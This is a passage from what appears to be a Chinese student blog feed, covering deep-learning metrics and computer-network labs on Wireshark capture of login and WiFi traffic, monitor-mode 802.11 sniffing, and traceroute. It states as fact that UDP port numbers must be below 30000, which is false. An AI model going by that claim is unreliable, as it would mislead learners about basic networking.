204 状态码, 那就说明能够连接上网络。</p>]]></content>
    
    
    <categories>
      
      <category>Course Study</category>
      
      <category>计算机网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Lab</tag>
      
      <tag>计算机网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>深度学习常用指标</title>
    <link href="/posts/77bbe37/"/>
    <url>/posts/77bbe37/</url>
    
    <content type="html"><![CDATA[<ol><li><p>真阳性True Positive（TP）：实际为阳性且预测为阳性的值。</p></li><li><p>假阳性False Positive（FP）：实际为负但预测为正的值。</p></li><li><p>假阴性False Negative（FN）：实际为正但预测为负的值。</p></li><li><p>真阴性True Negative (TN)：实际为负且预测为负的值。</p></li></ol><p>**真阳性率（TPR）：**真阳性/阳性（高为优）</p><p>可以理解为所有正类中，有多少被预测成正类（<strong>正类预测正确</strong>），即<strong>召回率</strong>：</p><p><img src="/posts/77bbe37/image-20220430115813641.png" alt="image-20220430115813641"></p><p>**假阳性率（FPR）：**假阳性/阴性（低为优）</p><p>可以理解为所有反类中，有多少被预测成正类（<strong>正类预测错误</strong>）：</p><p><img src="/posts/77bbe37/image-20220430115904186.png" alt="image-20220430115904186"></p><p>**假阴性率（FNR）：**假阴性/阳性（低为优）</p><p>FNR（False Negative Rate）可以理解为所有正类中，有多少被预测成反类（<strong>反类预测错误</strong>）：</p><p><img src="/posts/77bbe37/image-20220430115935819.png" alt="image-20220430115935819"></p><p>**真阴性率（TNR）：**真阴性/阴性（高为优）</p><p>可以理解为所有反类中，有多少被预测成反类（<strong>反类预测正确</strong>）：</p><p><img src="/posts/77bbe37/image-20220430120047267.png" alt="image-20220430120047267"></p><p>对于下面的图：</p><p><img src="/posts/77bbe37/image-20220430114643653.png" alt="image-20220430114643653"></p><p>结果为</p><p>TPR = TP/P = 94/100 = 94%</p><p>TNR = TN/N = 850/900 = 94.4%</p><p>FPR = FP/N = 50/900 = 5.5%</p><p>FNR = FN/p =6/100 = 6%</p><h3 id="准确率accuracy"><a class="markdownIt-Anchor" href="#准确率accuracy"></a> 准确率（accuracy)</h3><p>Accuracy（准确率）可以理解为<strong>所有实验中，分类正确的个数</strong>：</p><p><img src="/posts/77bbe37/image-20220430120226212.png" alt="image-20220430120226212"></p><h3 id="精度precision"><a class="markdownIt-Anchor" href="#精度precision"></a> 精度（precision）</h3><p>精度（precision） = TP/predcit Positive</p><p>精度是所有被预测为正的点，其中有多少百分比实际上是正的。</p><p>precision=TP/(TP+FP)</p><h3 id="召回率recall"><a class="markdownIt-Anchor" href="#召回率recall"></a> 召回率(recall)</h3><p>召回率(recall)=真阳性/实际阳性</p><p>实际上是阳性的所有点，并被预测为阳性的百分比。</p><p>recall=TP/(TP+FN)</p><h3 id="f1-score"><a class="markdownIt-Anchor" href="#f1-score"></a> F1-Score</h3><p>F1 = 2 * (精度 * 召回率) / (精度 + 召回率)</p><p><img src="/posts/77bbe37/image-20220430120526865.png" alt="image-20220430120526865"></p><p><strong>综合考虑Precision和Recall的指标</strong></p>]]></content>
    
    
    <categories>
      
      <category>Memo</category>
      
      <category>Learing Record</category>
      
    </categories>
    
    
    <tags>
      
      <tag>DeepLearning</tag>
      
      <tag>备忘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络Lab2</title>
    <link href="/posts/18403c5d/"/>
    <url>/posts/18403c5d/</url>
    
    <content type="html"><![CDATA[<h1 id="实验二"><a class="markdownIt-Anchor" href="#实验二"></a> 实验二</h1><h2 id="1使用wireshark窃听你电脑上的http流量在你尝试登录httpwebmailhnueducn的时候解释一下抓到的流量"><a class="markdownIt-Anchor" href="#1使用wireshark窃听你电脑上的http流量在你尝试登录httpwebmailhnueducn的时候解释一下抓到的流量"></a> 1.使用wireshark窃听你电脑上的http流量，在你尝试登录http://webmail.hnu.edu.cn的时候解释一下抓到的流量</h2><p>我们在网页中打开该地址后实际访问的是http://mail.hnu.edu.cn/</p><p>然后我们需要知道该地址对应的ip地址，这样才能在wireshark中进行过滤，我们ping一下该地址，就可以知道其IP地址</p><p><img src="/posts/18403c5d/image-20220420132251262.png" alt="image-20220420132251262"></p><p>然后我们设置过滤条件</p><p>ip.addr表示监控目标IP和源ip地址为112.90.80.23的请求，并且加上http来监控http流量</p><figure class="highlight ini"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">ip.addr</span>==<span class="hljs-number">112.90</span>.<span class="hljs-number">80.23</span> and http<br></code></pre></div></td></tr></table></figure><p>在我们没有打开该网页时，该地址没有任何网络流量</p><p><img src="/posts/18403c5d/image-20220420125110790.png" alt="image-20220420125110790"></p><p>然后我们打开该网址</p><p><img src="/posts/18403c5d/image-20220420112655214.png" alt="image-20220420112655214"></p><p>可以发现出现了下面的流量信息</p><p>源主机10.68.198.0向目标IP地址14.17.5.207发送get方法，请求得到了上述页面上的各个元素，然后还有一些请求成功后目标ip发回来的反馈消息</p><p><img src="/posts/18403c5d/image-20220420133711043.png" alt="image-20220420133711043"></p><p>比如其中的qrcode字样就代表这个请求是得到二维码图片</p><p>输入密码后点击登录，出现下面的页面：</p><p><img src="/posts/18403c5d/image-20220420112814695.png" alt="image-20220420112814695"></p><ul><li><p>这时我们可以看到出现了<strong>post请求</strong>，就是我们提交账号密码的过程向目标主机发送了一个post请求，</p><p>然后这个请求可以看到是成功了，因为成功收到了200 OK的http响应，说明账号验证通过</p></li><li><p>但是其还需要我们通过微信认证，所以又发出来一个<strong>get请求</strong>得到了微信验证的二维码，get请求里我们也可以看到qrcode字样</p></li></ul><p><img src="/posts/18403c5d/image-20220420133539895.png" alt="image-20220420133539895"></p><p>在我们成功扫码通过验证后，我们就可以进入我们的邮箱首页了，然后又是一连串get方法向服务器请求得到各种页面信息</p><p><img src="/posts/18403c5d/image-20220420133622895.png" alt="image-20220420133622895"></p><p><img src="/posts/18403c5d/image-20220420133641441.png" alt="image-20220420133641441"></p><p>在上面的请求中，我们看第一条请求，可以看到code字样以及jump字样，说明在扫码验证完成后，会执行一个跳转操作，然后就会跳到我们的邮箱主页了</p><h2 id="2使用wireshark窃听您的计算机上的流量解释当您尝试连接hnu无线网络时捕获的流量并使用其web界面完成radius认证"><a class="markdownIt-Anchor" href="#2使用wireshark窃听您的计算机上的流量解释当您尝试连接hnu无线网络时捕获的流量并使用其web界面完成radius认证"></a> 2.使用wireshark窃听您的计算机上的流量，解释当您尝试连接HNU无线网络时捕获的流量，并使用其Web界面完成RADIUS认证。</h2><h3 id="连接hnu无线网络时捕获的流量"><a class="markdownIt-Anchor" href="#连接hnu无线网络时捕获的流量"></a> 连接HNU无线网络时捕获的流量</h3><p>从没有网络连接，到打开wifi，连接HNU时的抓包结果：</p><p><img src="/posts/18403c5d/image-20220421100439936.png" alt="image-20220421100439936"></p><p>报文分析：</p><ul><li><p><strong>DHCP(动态主机设置协议)</strong>:自动分配IP地址。客户端请求DHCP服务器分配一个IP地址。</p><ul><li><p>可以看到，客户机首先发送一个DHCP Request请求</p><p><img src="/posts/18403c5d/image-20220421100723436.png" alt="image-20220421100723436"></p><p>其中包含客户机请求的IP地址，这个IP其实是实现已经分配好的，因为还在租期内，所以客户机就直接发出请求该IP地址了</p><p>如果没有事先分配，就在这之前还需要一个DHCP request请求，然后DHCP服务器会回应一个offer，其中会给出其分配的IP地址。</p><p><img src="/posts/18403c5d/image-20220421101034077.png" alt="image-20220421101034077"></p></li><li><p>DHCP 服务器接收到客户机的Request 之后会给客户机发送确认ACK消息，告知客户机可以使用该 IP 地址。并且在此之后，客户机将使用该地址</p><p><img src="/posts/18403c5d/image-20220421101630429.png" alt="image-20220421101630429"></p><p><img src="/posts/18403c5d/image-20220421101644143.png" alt="image-20220421101644143"></p></li><li><p>夹在这两条报文中间的<strong>DHCPv6</strong>是一个用来配置工作在IPv6网络上的IPv6主机所需的IP地址、IP前缀和/或其他配置的网络协议。</p></li></ul></li><li><p><strong>IGMPv2(互联网组管理协议)</strong>:是TCP/IP协议族中负责IPV4组播成员管理的协议。</p><ul><li><p>首先<strong>针对所有组播组发起组成员查询</strong></p><p><img src="/posts/18403c5d/image-20220421102606538.png" alt="image-20220421102606538"></p></li><li><p>当组成员收到普遍组查询报文后，<strong>随机延时一个0-10s的时间</strong>后，发送成员报告报文，SIP为<strong>主机自身接口IP地址</strong>，DIP为该主机所属的组播组地址，Group address为主机所属的组播组地址。</p><p><img src="/posts/18403c5d/image-20220421102649900.png" alt="image-20220421102649900"></p></li><li><p>离组播报：IGMPv2 中，当一个主机离开某组播组时：</p><ul><li>该主机向本地网段内的所有组播路由器(目的地址为224.0.0.2)发送离开组(Leave Group)报文</li></ul><p><img src="/posts/18403c5d/image-20220421103010849.png" alt="image-20220421103010849"></p></li></ul></li><li><p><strong>ICMPv6</strong>（Internet Control Message Protocol for the IPv6）是IPv6的基础协议之一。</p><ul><li><p><strong>成员报告报文</strong>（Multicast Listener Report）：主机向查询器发送的报告报文，用于申请加入某个组播组或者应答查询报文。</p><p><img src="/posts/18403c5d/image-20220421104325392.png" alt="image-20220421104325392"></p></li><li><p><strong>NS报文（Neighbor Solicitation）</strong>：当节点不知道目标地址的链路层地址时，将发送NS消息。此时 NS消息的源地址是发送接口的 global地址，目标地址是被访问的地址所对应的被请求节点组播地址。此消息中包含发送端的链路层地址，作用类似于ARP请求，这里的链路层地址一般是指以太网的MAC地址。此外，NS还可以用来检测邻居的可达性和进行地址冲突检测</p><p><img src="/posts/18403c5d/image-20220421104657999.png" alt="image-20220421104657999"></p><p><img src="/posts/18403c5d/image-20220421104727880.png" alt="image-20220421104727880"></p></li><li><p><strong>RS报文（Router Solicitation)</strong>：当主机刚刚接入网络并被配置为自动获取地址，主机需要自动获得前缀、前缀长度、默认网关等信息时，就会发送RS消息。源IP是发送接口的Link Local地址或者未指定地址，目的地址是FFO2::1或FFO2::2</p><p><img src="/posts/18403c5d/image-20220421104917030.png" alt="image-20220421104917030"></p></li></ul></li><li><p><strong>LLMNR(链路本地多播名称解析)</strong>:主机在自己的内部名称缓存中查询名称。如果在缓存中没有找到名称，那么主机就会向自己配置的主<a href="https://baike.baidu.com/item/DNS%E6%9C%8D%E5%8A%A1%E5%99%A8/8079460">DNS服务器</a>发送查询请求。如果主机没有收到回应或收到了错误信息，主机还会尝试搜索配置的备用DNS服务器。如果主机没有配置DNS服务器，或者如果在连接DNS服务器的时候没有遇到错误但失败了，那么名称解析会失败，并转为使用LLMNR。</p><p>这个相当于在使用DNS前先进行本地查询</p><p><img src="/posts/18403c5d/image-20220421105224095.png" alt="image-20220421105224095"></p></li><li><p><strong>ARP(地址解析协议)</strong>:通过解析网络层地址来找寻数据链路层地址的网络传输协议</p><p>简而言之，就是通过目标主机的IP地址，查询目标主机的MAC地址，以保证通信的顺利进行</p><p><img src="/posts/18403c5d/image-20220421110159567.png" alt="image-20220421110159567"></p></li><li><p><strong>DNS：</strong> 将人类可读的域名 (例如，<a href="http://www.amazon.com">www.amazon.com</a>) 转换为机器可读的 IP 地址 (例如，192.0.2.44)</p><p><img src="/posts/18403c5d/image-20220421110754571.png" alt="image-20220421110754571"></p><p>如图，到这一步，网络连接其实都已经完成了，就开始测试能否上网了。</p><ul><li><p>首先发出一个DNS请求目标测试地址www.msftconnecttest.com的IP地址</p></li><li><p>然后DNS服务器会发回一个响应报文，告知查询到的IP地址</p><p><img src="/posts/18403c5d/image-20220421111101368.png" alt="image-20220421111101368"></p></li></ul></li><li><p>之后就开始<strong>TCP连接</strong>了</p><p>筛选一下这个ip地址有关的报文，我们就可以发现这里面有TCP的三次握手(红色框）和四次挥手(蓝色框）过程，以及中间的数据传输过程(绿色框)</p><p><img src="/posts/18403c5d/image-20220421111705601.png" alt="image-20220421111705601"></p><p>经过这个检验，我们就可以知道自己的网络连接已经成功了，可以进行上网了。</p><p>然后之后的报文就是关于各种服务网络连接的报文了。</p></li></ul><h3 id="web界面完成radius认证"><a class="markdownIt-Anchor" href="#web界面完成radius认证"></a> Web界面完成RADIUS认证</h3><p>当我们访问校园网<a href="http://10.62.106.218/">WEB界面</a>时，我们会看到如下TCP连接信息，也可以看到TCP的三次握手(红色框）和四次挥手(蓝色框）过程，以及中间的数据传输过程</p><p><img src="/posts/18403c5d/image-20220421152141368.png" alt="image-20220421152141368"></p><p>而且这个登录界面并不是通过post来提交登录信息，而是通过get,我们点击登录后可以看到出现新的TCP三次握手和get请求。</p><p><img src="/posts/18403c5d/image-20220422194915933.png" alt="image-20220422194915933"></p><h2 id="3可选如果您的计算机的无线驱动程序允许混杂模式和监控空中的所有-80211-帧请使用-wireshark-捕获进出附近-hnu-接入点或星巴克-ap或任何不加密-wifi-的任何-ap的流量-流量尝试寻找有趣的内容-注意您有责任保护数据隐私"><a class="markdownIt-Anchor" href="#3可选如果您的计算机的无线驱动程序允许混杂模式和监控空中的所有-80211-帧请使用-wireshark-捕获进出附近-hnu-接入点或星巴克-ap或任何不加密-wifi-的任何-ap的流量-流量尝试寻找有趣的内容-注意您有责任保护数据隐私"></a> 3.（可选）如果您的计算机的无线驱动程序允许混杂模式和监控空中的所有 802.11 帧，请使用 wireshark 捕获进出附近 HNU 接入点（或星巴克 AP，或任何不加密 WiFi 的任何 AP）的流量 流量），尝试寻找有趣的内容。 注意：您有责任保护数据隐私</h2><p>在做第二题时最开始以为是要我们抓到WLAN连接过程中的报文，但是尝试了半天后还是无法成功在wireshark中抓到802.11类型的帧，后来才发现原来是受制于硬件，需要有能够开启monitor模式的无线网卡，挣扎了半天终于接受了自己网卡无法开启monitor模式的事实。</p><p>而在上文中我们抓到的包，其实是在WLAN连接完成后发出的报文，我原先希望抓到具体的WLAN连接过程的帧看一下整个过程，但受制于硬件，那只能基于资料了解一下了。（后来借到了无线网卡，尝试抓了一下，记录了一下一些抓到的包）</p><p>连接无线网卡，开启moniter模式</p><p>首先需要安装npcap，然后进入npcap的目录下，利用其提供的wlanhelper将网卡的模式改为moniter</p><p><img src="/posts/18403c5d/image-20220422105516530.png" alt="image-20220422105516530"></p><p>之后在wireshark的捕获选项中勾选上监控模式，就可以抓到802.11帧了</p><p><img src="/posts/18403c5d/image-20220422111121764.png" alt="image-20220422111121764"></p><h3 id="wlan连接完整过程"><a class="markdownIt-Anchor" href="#wlan连接完整过程"></a> WLAN连接完整过程</h3><p><img src="/posts/18403c5d/image-20220421150105820.png" alt="image-20220421150105820"></p><h4 id="连接三步骤"><a class="markdownIt-Anchor" href="#连接三步骤"></a> 连接三步骤</h4><ol><li>扫描（Probe Request、Probe Response）</li><li>认证（Authentication）</li><li>关联（Association Request、Association Response）</li></ol><p><em><strong>首先AP会发送Beacon广播管理帧</strong></em></p><p>因为AP发送的这个Beacon管理帧数据包是广播地址，所以我们的PCMIA内置网卡、或者USB外界网卡会接收到这个数据包，然后在我们的&quot;无线连接列表&quot;中显示出来。</p><p><img src="/posts/18403c5d/image-20220422101535983.png" alt="image-20220422101535983"></p><h5 id="1-扫描阶段"><a class="markdownIt-Anchor" href="#1-扫描阶段"></a> 1. 扫描阶段</h5><ul><li><p>STA 发送 Probe Req 帧，携带 SSID 表明欲加入的网络，携带 Supported Rates 表明自身的能力。</p></li><li><p>AP 回复 Probe Rsp 帧，这是 AP 的义务，(AP 允许此 STA 连接的情况下)也携带 Supported Rates 表明自身的能力。</p></li></ul><p>作用：STA 获取 AP 的能力，决定要不要加入该网络；AP 获取 STA 能力，并根据自身情况决定要不要让该 STA 加入自身网络。</p><p>这个阶段只抓到probe req帧，没有抓到probe rsp帧</p><p><img src="/posts/18403c5d/image-20220422110754650.png" alt="image-20220422110754650"></p><h5 id="2-认证阶段"><a class="markdownIt-Anchor" href="#2-认证阶段"></a> 2. 认证阶段</h5><p>STA 收到 Probe Rsp 帧，决定要不要加入此网络，若决定加入，则发送 Auth 帧进行身份认证，否则流程接收。</p><p>STA 在 Auth 包中表明认证算法类型，0：Open System，1：Shared Key。</p><p>Shared Key 方式即代表使用 WEP 加密方式，Open System 方式即代表使用 TKIP/WPA/WPA2 方式。</p><p>使用 <strong>Shared Key</strong> 方式，是真实的身份认证过程，Auth 共有 4 步骤：</p><ul><li>Auth seq#1：由 STA 发起认证请求，携带认证算法类型：Shared Key</li><li>Auth seq#2：AP 回复一个挑战明文(challenge text )</li><li>Auth seq#3：STA 使用预设密钥对挑战铭文进行加密，然后发送给 AP</li><li>Auth seq#4：AP 收到后，使用密钥对收到的消息进行解密，如果解密成功且明文一致表示认证成功，回复 successful</li></ul><p>使用 <strong>Open System</strong> 方式，表明真正的身份认证放到 EAPOL 阶段，所以 Auth 只有两步骤：</p><ul><li>Auth seq#1：由 STA 发起认证请求，携带认证算法类型：Open System</li><li>Auth seq#2：AP 直接回复 successful，因为真正的身份认证会放在 EAPOL 阶段</li></ul><p>这个阶段的包抓到了</p><p><img src="/posts/18403c5d/image-20220422110439109.png" alt="image-20220422110439109"></p><h5 id="3-关联阶段"><a class="markdownIt-Anchor" href="#3-关联阶段"></a> 3. 关联阶段</h5><p>STA 收到认证通过报文后，决定要加入当前网络，就会发送 Assoc Req 帧。指明要加入的网络的类型、自己的 Listen Interval(聆听间隔，即 STA 多久聆听一次 Beacon 帧，以监听 TIM 信息)和一些能力信息。</p><p>AP 收到 Assoc Req 帧后，最终确认 STA 的 Listen Interval 自己能不能接受，能力信息是否匹配，如果一切 OK，回复 Assoc Rsp 帧，携带 AID(Association ID) 和 successful 信息，表明关联成功。否则，回复 Assoc Rsp 帧，携带 failed 信息，表明关联失败，同时 AP 也会从 mac table 中删除此 STA。</p><p>这个阶段只抓到了assoc rsp，没有抓到asso res</p><p><img src="/posts/18403c5d/image-20220422110544023.png" alt="image-20220422110544023"></p><h5 id="4-eapol-阶段"><a class="markdownIt-Anchor" href="#4-eapol-阶段"></a> 4. EAPOL 阶段</h5><p>如果采用的是 Shared Key 方式，即 WEP 加密方式，认证已在 Auth 阶段完成，完成上述关联阶段即已正式加入网络，后续可以通过密钥对消息加解密和 AP 进行正常通信了。</p><p>如果采用的是 Open System 方式，即 TKIP/WPA/WPA2 方式，在 Auth 阶段其实没有进行身份认证的工作，在 Auth 阶段就决定把身份认证的工作放在当前 EAPOL 阶段了。所以此种方式下，要进行 EAPOL 步骤，常见的就是 4-way handshake，当然还有 2-way-handshake。此处只讨论 4-way handshake，如下</p><p><img src="/posts/18403c5d/image-20220421151425836.png" alt="image-20220421151425836"></p><ul><li>step 1：AP 首先发送 Message 1，包含 ANonce</li><li>step 2：STA 收到 ANonce，同时也能拿到 AA(Authenticator addr)，SA(Supplicant addr)是自己本身的信息，SNonce 又是自己现在生成的信息，PMK 是通过自身密码和 SSID 计算得到的，也是已知信息。此刻，STA 已具备计算 PTK 的所有五元组信息，所有能够计算得到 PTK。然后用 PTK 的 KCK 位对马上要发送的数据包进行计算得到 MIC，并将 MIC 附着在包尾一同发送给 AP</li><li>step 3：AP 收到Message 2，此时也具备了所有的五元组信息，也成功计算出了 PTK，并用 PTK 的 KCK 位对收到的数据进行计算得到 MIC，计算得到的 MIC 与收到的 MIC 进行对比，如果相等则代表 AP 和 STA 拥有相同的 PTK，进而可以确定两者拥有相同的 PMK，进而可以确定两者拥有相同的密码，AP 向 STA 回复 Message 3，包含被加密的 GTK(用于对广播数据帧和组播数据帧加密) 和 MIC。如果不相等，则身份认证失败，回复认证失败报文。至此，可以完成身份认证的工作。且，身份认证成功之后，数据可以通过 PTK 进行加解密。</li><li>step 4：STA 收到 被加密了的 GTK，因为手中已有 PTK，所以可以从中解出 GTK。然后 AP 和 STA 安装 PTK 和 GTK，整个认证和密钥交换过程至此结束。</li></ul><p>但是回到这道题本身，对于wireshark抓到的报文里，对于一些可能会暴露同在校园网中的他人信息的有趣报文并没有什么发现（可能是自己分析方法不对QvQ）</p>]]></content>
    
    
    <categories>
      
      <category>Course Study</category>
      
      <category>计算机网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Lab</tag>
      
      <tag>计算机网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络Lab1</title>
    <link href="/posts/81496de7/"/>
    <url>/posts/81496de7/</url>
    
    <content type="html"><![CDATA[<h1 id="实验一"><a class="markdownIt-Anchor" href="#实验一"></a> 实验一</h1><h2 id="1解释traceroute的工作原理"><a class="markdownIt-Anchor" href="#1解释traceroute的工作原理"></a> 1.解释traceroute的工作原理</h2><p><strong>traceroute</strong>，Windows系统称为<strong>tracert</strong>，是一种电脑网络工具。它可显示数据包在IP网络经过的路由器的IP地址。</p><p>Tracert 命令用 IP 生存时间 (TTL) 字段和 ICMP 错误消息来确定从一个主机到网络上其他主机的路由。</p><p>主叫方首先发出 TTL=1 的数据包，第一个路由器将 TTL 减1得0后就不再继续转发此数据包，而是返回一个 ICMP 超时报文，主叫方从超时报文中即可提取出数据包所经过的第一个网关地址。然后又发出一个 TTL=2 的 ICMP 数据包，可获得第二个网关地址，依次<strong>递增 TTL</strong> 便获取了沿途所有网关地址。</p><p>工作流程如图所示：</p><p><img src="/posts/81496de7/image-20220413131422144.png" alt="image-20220413131422144"></p><p>示例（具体分析见[第四题](#4.使用 traceroute 程序尝试两个目的地：<a href="http://www.baidu.com">www.baidu.com</a> 和 <a href="http://www.google.com">www.google.com</a>，解释结果)）：</p><p><img src="/posts/81496de7/image-20220413130403509.png" alt="image-20220413130403509"></p><p>需要注意的是，并不是所有网关都会如实返回 ICMP 超时报文。出于安全性考虑，大多数防火墙以及启用了防火墙功能的路由器缺省配置为不返回各种 ICMP 报文，其余路由器或交换机也可被管理员主动修改配置变为<strong>不返回 ICMP 报文</strong>。因此 Traceroute 程序不一定能拿全所有的沿途网关地址。所以，当某个 TTL 值的数据包得不到响应时，<strong>并不能停止这一追踪过程</strong>，程序仍然会把 <strong>TTL 递增</strong>而发出下一个数据包。一直达到默认或用参数指定的追踪限制（maximum_hops）才结束追踪。</p><p>依据上述原理，利用了 <strong>UDP 数据包</strong>的 Traceroute 程序在数据包到达真正的目的主机时，就可能因为该主机没有提供 UDP 服务而简单将数据包抛弃，并不返回任何信息。为了解决这个问题，Traceroute 故意使用了一个大于 30000 的端口号，因 UDP 协议规定端口号必须小于 30000 ，所以目标主机收到数据包后唯一能做的事就是返回一个“端口不可达”的 ICMP 报文，于是主叫方就将端口不可达报文当作跟踪结束的标志。</p><h2 id="2它在哪一层工作如何工作"><a class="markdownIt-Anchor" href="#2它在哪一层工作如何工作"></a> 2.它在哪一层工作，如何工作？</h2><p>自顶向下，首先我们可以知道<strong>http是应用层协议、UDP/TCP是运输层协议、ICMP是网络层协议</strong></p><p>而如果是默认的traceroute,它使用的是UDP协议，同时会收到ICMP错误应答，所以可以认为其工作涉及到了<strong>运输层和网络层</strong></p><p>而在windows下，默认发送的是<strong>ICMP回显请求（echo request）<strong>数据包，然后收到一个ICMP回显应答，linux下也可以添加-I参数来控制使用ICMP回显请求发送报文，这不涉及UDP，所以可以认为其工作在</strong>网络层</strong>。</p><p>对于<strong>使用UDP的traceroute</strong>,它用udp协议向目的主机一个不可达的端口发送数据包，经过层层路由后，目的主机会发送一个端口不可达的ICMP报文</p><p>对于使用ICMP的traceroute,它用ICMP协议向目的主机发送数据包，经过层层路由后，收到ICMP回显应答。</p><h2 id="3linux-windows不同版本和macos-中的traceroute-实现有什么不同吗"><a class="markdownIt-Anchor" href="#3linux-windows不同版本和macos-中的traceroute-实现有什么不同吗"></a> 3.Linux、Windows（不同版本）和macOS 中的traceroute 实现有什么不同吗？</h2><h3 id="windows"><a class="markdownIt-Anchor" href="#windows"></a> windows</h3><p>windows下的叫做tracert,默认使用ICMP echo发送报文。如果tracert baidu的话可以成功到达目的主机</p><p><img src="/posts/81496de7/image-20220413145745852.png" alt="image-20220413145745852"></p><p>通过wireshark抓包我们可以发现都是ICMP报文：</p><p><img src="/posts/81496de7/image-20220413144938751.png" alt="image-20220413144938751"></p><h3 id="linux"><a class="markdownIt-Anchor" href="#linux"></a> linux</h3><p>linux下traceroute带有很多参数，我们可以看到可以使用-I来使用ICMP echo回显请求发送报文，可以使用-T来用TCP发送报文</p><p><img src="/posts/81496de7/image-20220413150105357.png" alt="image-20220413150105357"></p><p>linux下traceroute不带任何参数的话默认使用UDP发送报文</p><p><img src="/posts/81496de7/image-20220413145026089.png" alt="image-20220413145026089"></p><p>wireshark抓包结果显示请求都是UDP报文，而应答则是ICMP</p><p><img src="/posts/81496de7/image-20220413145044982.png" alt="image-20220413145044982"></p><p>在这种情况下我们发现不可以到达目的地址，且都没有应答，这就和开始时的原理分析相对应：</p><blockquote><p>不是所有网关都会如实返回 ICMP 超时报文。出于安全性考虑，大多数防火墙以及启用了防火墙功能的路由器缺省配置为不返回各种 ICMP 报文，其余路由器或交换机也可被管理员主动修改配置变为<strong>不返回 ICMP 报文</strong>。因此 Traceroute 程序不一定能拿全所有的沿途网关地址。所以，当某个 TTL 值的数据包得不到响应时，<strong>并不能停止这一追踪过程</strong>，程序仍然会把 <strong>TTL 递增</strong>而发出下一个数据包。一直达到默认或用参数指定的追踪限制（maximum_hops）才结束追踪。</p><p>利用了 <strong>UDP 数据包</strong>的 Traceroute 程序在数据包到达真正的目的主机时，就可能因为该主机没有提供 UDP 服务而简单将数据包抛弃，并不返回任何信息。</p></blockquote><p>所以在linux下默认使用UDP的请求很多无法收到应答，在追踪限制结束前也无法到达目的地址</p><p>当我们给其加上-I参数，表示要求traceroute以ICMP echo回显请求发送报文，这是我们就可以收到请求并成功到达目的主机了</p><p><img src="/posts/81496de7/image-20220413145558490.png" alt="image-20220413145558490"></p><p>观察wireshark抓包结果，无论是请求报文还是应答报文都是ICMP类型了，和前面的分析对应上了。</p><p><img src="/posts/81496de7/image-20220413145611582.png" alt="image-20220413145611582"></p><h3 id="macos"><a class="markdownIt-Anchor" href="#macos"></a> macOS</h3><p>macOS的情况和linux类似，默认使用UDP发包，无法到达目的主机。</p><p><img src="/posts/81496de7/image-20220413145915684.png" alt="image-20220413145915684"></p><p>加上-I后可以成功，原因和linux相同。</p><p><img src="/posts/81496de7/image-20220413145827771.png" alt="image-20220413145827771"></p><h2 id="4使用-traceroute-程序尝试两个目的地wwwbaiducom-和-wwwgooglecom解释结果"><a class="markdownIt-Anchor" href="#4使用-traceroute-程序尝试两个目的地wwwbaiducom-和-wwwgooglecom解释结果"></a> 4.使用 traceroute 程序尝试两个目的地：<a href="http://www.baidu.com">www.baidu.com</a> 和 <a href="http://www.google.com">www.google.com</a>，解释结果</h2><p>baidu</p><p><img src="/posts/81496de7/image-20220413150347535.png" alt="image-20220413150347535"></p><p>报文分析：</p><ul><li><p>首先，域名 <a href="http://www.baidu.com">www.baidu.com</a> 对应多个IP地址，这里采用了其中一个IP地址 [112.80.248.75]，对应的主机名是  <a href="http://www.a.shifen.com">www.a.shifen.com</a>。</p></li><li><p>从当前主机，到目标主机，最多经过30跳（30hops ）</p></li><li><p>每一行包含三部分：序号  + 耗时 + 主机</p><ul><li>行首是序号，表示这是经过的第N个中间节点。然后是到达节点所耗费的时间。后面是节点的主机IP地址</li></ul></li></ul><blockquote><p>每次检测都同时发送3个数据包，因此打印出来三个时间。此外，如果某一个数据报超时没有返回，则时间显示为 *（不通或者是因为防火墙等原因请求报文被忽略了）。</p></blockquote><p>google</p><p><img src="/posts/81496de7/image-20220413150433936.png" alt="image-20220413150433936"></p><p>tracert baidu的话可以成功到达，tracert google的在指定追踪次数之前都不能到达，且基本上数据报都超时未返回，原因分析见下。</p><h2 id="5如果您有一个可以浏览wwwgooglecom"><a class="markdownIt-Anchor" href="#5如果您有一个可以浏览wwwgooglecom"></a> <a href="http://5.xn--www-p18dohp5b80vdslu9pu6ofpboy8amk1g.google.com">5.如果您有一个可以浏览www.google.com</a> 的socks代理，有什么不同吗？</h2><p>我们加上代理后再尝试一次，结果还是一样，还是无法到达google的目的主机。</p><h3 id="原因探究"><a class="markdownIt-Anchor" href="#原因探究"></a> <strong>原因探究</strong></h3><p>先来理解一下什么是sock5代理</p><p>socks代理：</p><p>socks5代理是把你的网络数据请求通过一条通道(连接你和代理服务器之间的通道)，由服务器转发到目的地，</p><p>这个过程中你是没有通过一条专用通道的，只是数据包的发出，然后被代理服务器收到，整个过程并没有额外的处理</p><p>SOCKS是一种网络传输协议，主要用于客户端与外网服务器之间通讯的中间传递。（定义）</p><p><strong>最重要的一点</strong></p><ul><li><p><strong>SOCKS协议是代理是介于传输层(第四层)和会话层(第五层)</strong></p></li><li><p><strong>ICMP协议是网络层(第三层)</strong></p></li></ul><p>而上层的协议是无法影响到下层的，虽然tracert也涉及到了传输层，但是socks协议是在传输层之上的，同样自然也在ICMP的网络层之上，所以我们无论使用traceroute的UDP形式发送报文，还是ICMP形式又或者是TCP形式，都是无法通过代理到达google的，因为代理是在更上层，而traceroure根本没有经过这一层。</p><p>ping也是工作在网络层，所以我们也无法ping通google,但是curl工作在应用层，和我们可以使用http访问google一样，所以使用curl可以成功。</p><p>附一张网上看到的图片，<strong>OSI 七层网络协议</strong>，非常清晰的展示了各种协议在各层的位置。</p><p><img src="/posts/81496de7/net.jpg" alt></p>]]></content>
    
    
    <categories>
      
      <category>Course Study</category>
      
      <category>计算机网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Lab</tag>
      
      <tag>计算机网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>bcc安装及基本使用教程</title>
    <link href="/posts/ae72ca8e/"/>
    <url>/posts/ae72ca8e/</url>
    
